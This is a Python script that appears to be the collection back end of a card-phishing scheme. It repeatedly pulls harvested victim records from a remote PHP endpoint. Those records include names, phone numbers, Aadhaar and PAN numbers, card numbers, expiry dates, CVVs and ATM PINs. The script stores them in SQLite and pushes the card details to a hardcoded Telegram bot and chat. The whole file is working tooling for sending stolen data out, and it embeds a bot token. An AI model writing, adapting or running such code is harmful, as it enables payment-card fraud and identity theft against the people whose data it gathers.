import requests
import sqlite3
import time
from datetime import datetime
import telebot
import logging
import re

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Telegram configuration
TELEGRAM_TOKEN = "7435105247:AAHztSsci9ZWRa7c94RQHxPrdE8YE6lNQmo"
CHAT_ID = "6460703454"

# Initialize bot
bot = telebot.TeleBot(TELEGRAM_TOKEN)

# Database setup
def setup_database():
    conn = sqlite3.connect('user_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id TEXT PRIMARY_KEY,
                  full_name TEXT,
                  mobile_number TEXT,
                  dob TEXT,
                  aadhaar_number TEXT,
                  account_number TEXT,
                  card_number TEXT,
                  expiry_date TEXT,
                  cvv TEXT,
                  atm_pin TEXT,
                  timestamp TEXT)''')
    conn.commit()
    conn.close()

# Fetch data from URL
def fetch_data(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.json()
        else:
            logging.error(f"Failed to retrieve data. HTTP Status: {response.status_code}")
            return None
    except Exception as e:
        logging.error(f"Error fetching data: {e}")
        return None

# Enhanced expiry date parser
def parse_expiry_date(expiry_date):
    if not expiry_date:
        return None, None
    
    # Remove any whitespace and convert to string
    expiry_date = str(expiry_date).strip()
    
    # Define possible patterns
    patterns = [
        r'(\d{2})/(\d{4})',      # MM/YYYY
        r'(\d{2})-(\d{4})',      # MM-YYYY
        r'(\d{2})(\d{4})',       # MMYYYY
        r'(\d{2})/(\d{2})',      # MM/YY
        r'(\d{2})-(\d{2})',      # MM-YY
        r'(\d{2})(\d{2})',       # MMYY
    ]
    
    for pattern in patterns:
        match = re.match(pattern, expiry_date)
        if match:
            month = match.group(1)
            year = match.group(2)
            
            # Validate month
            if not (1 <= int(month) <= 12):
                return None, None
                
            # Handle two-digit year
            if len(year) == 2:
                year = f"20{year}"
            
            # Validate year (basic check)
            if not (2000 <= int(year) <= 2099):
                return None, None
                
            return month.zfill(2), year
    
    logging.warning(f"Unrecognized expiry date format: {expiry_date}")
    return None, None

# Send message to Telegram with professional formatting including mobile number
def send_telegram_message(entry):
    message = (
        "🔒 *New Card Details Notification*\n"
        "──────────────────────\n"
        f"*Cardholder Name*: {entry['full_name']}\n"
        f"*Mobile Number*: {entry['mobile_number']}\n"
        f"*Card Number*: {entry['card_number']}\n"
        f"*Expiry Date*: {entry['expiry_month']}/{entry['expiry_year']}\n"
        f"*CVV*: {entry['cvv']}\n"
        "──────────────────────\n"
        f"*Received*: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    try:
        bot.send_message(CHAT_ID, message, parse_mode='Markdown')
        logging.info(f"Message sent successfully: {entry['full_name']}")
    except Exception as e:
        logging.error(f"Failed to send Telegram message: {e}")

# Send all existing entries from database
def send_existing_entries():
    conn = sqlite3.connect('user_data.db')
    c = conn.cursor()
    
    c.execute('''SELECT full_name, mobile_number, card_number, expiry_date, cvv 
                 FROM users 
                 WHERE card_number IS NOT NULL 
                 AND expiry_date IS NOT NULL 
                 AND cvv IS NOT NULL''')
    
    existing_entries = c.fetchall()
    conn.close()
    
    if existing_entries:
        logging.info(f"Found {len(existing_entries)} existing entries with card details")
        for entry in existing_entries:
            full_name, mobile_number, card_number, expiry_date, cvv = entry
            expiry_month, expiry_year = parse_expiry_date(expiry_date)
            if expiry_month and expiry_year:
                entry_data = {
                    "full_name": full_name,
                    "mobile_number": mobile_number or "Not provided",
                    "card_number": card_number,
                    "expiry_month": expiry_month,
                    "expiry_year": expiry_year,
                    "cvv": cvv
                }
                send_telegram_message(entry_data)
                time.sleep(1)
    else:
        logging.info("No existing entries with card details found in database")
        bot.send_message(CHAT_ID, 
                        "ℹ️ *Notification*\nNo previous entries with card details found in the database.",
                        parse_mode='Markdown')

# Process and check for new entries
def process_data(data):
    conn = sqlite3.connect('user_data.db')
    c = conn.cursor()
    
    new_entries_with_cards = []
    
    for user in data:
        user_id = user.get("id")
        
        c.execute("SELECT id FROM users WHERE id = ?", (user_id,))
        if c.fetchone() is None:
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            card_number = user.get("card_number")
            expiry_date = user.get("expiry_date")
            cvv = user.get("cvv")
            mobile_number = user.get("registered_mobile_number")
            
            if card_number and expiry_date and cvv:
                expiry_month, expiry_year = parse_expiry_date(expiry_date)
                if expiry_month and expiry_year:
                    new_entry = {
                        "full_name": user.get("full_name"),
                        "mobile_number": mobile_number or "Not provided",
                        "card_number": card_number,
                        "expiry_month": expiry_month,
                        "expiry_year": expiry_year,
                        "cvv": cvv
                    }
                    new_entries_with_cards.append(new_entry)
            
            c.execute('''INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id,
                      user.get("full_name"),
                      mobile_number,
                      user.get("date_of_birth"),
                      user.get("aadhaar_card_number"),
                      user.get("pan_number"),
                      card_number,
                      expiry_date,
                      cvv,
                      user.get("atm_pin"),
                      current_time))
    
    conn.commit()
    conn.close()
    return new_entries_with_cards

# Main polling loop
def main():
    url = "http://foxdevpapa.net.in/datauser/fetchh.php"
    setup_database()
    
    logging.info("Sending existing entries from database")
    send_existing_entries()
    
    while True:
        logging.info(f"Polling at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        data = fetch_data(url)
        if data:
            try:
                new_entries = process_data(data)
                if new_entries:
                    logging.info(f"Found {len(new_entries)} new entries with card details")
                    for entry in new_entries:
                        send_telegram_message(entry)
                        time.sleep(1)
                else:
                    logging.info("No new entries with card details found")
            except ValueError:
                logging.error("Failed to parse JSON. Response may not be in JSON format.")
            except Exception as e:
                logging.error(f"Error processing data: {e}")
        
        time.sleep(300)  # Changed to 5 minutes (300 seconds)

if __name__ == "__main__":
    setup_database()
    try:
        telebot.logger.setLevel(logging.INFO)
        logging.info("Bot started")
        main()
    except KeyboardInterrupt:
        logging.info("Bot stopped by user")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
